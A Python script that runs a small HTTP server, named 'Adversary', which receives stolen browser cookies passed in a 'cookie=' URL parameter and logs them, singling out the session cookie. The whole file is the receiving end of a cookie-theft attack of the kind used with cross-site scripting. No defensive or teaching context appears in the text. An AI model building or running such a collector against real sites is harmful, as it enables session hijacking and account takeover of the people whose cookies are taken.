from http import server
import logging
from urllib.parse import unquote


def extract_cookies(path):
    path = unquote(path)
    cookies = path.split('cookie=')[1]
    cookies = {k: v for k, v in [c.split('=') for c in cookies.split('; ')]}
    return cookies


class Adversary(server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        try:
            cookies = extract_cookies(self.path)
            logging.info('Cookies: %s', cookies)
            logging.info('Session cookie: %s', cookies['session'])
        except IndexError:
            logging.info('No cookie')


def run():
    logging.basicConfig(level=logging.INFO)
    server_address = ('', 8080)
    httpd = server.HTTPServer(server_address, Adversary)
    logging.info('Starting httpd...')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    logging.info('Stopping httpd...')
    httpd.server_close()


if __name__ == '__main__':
    run()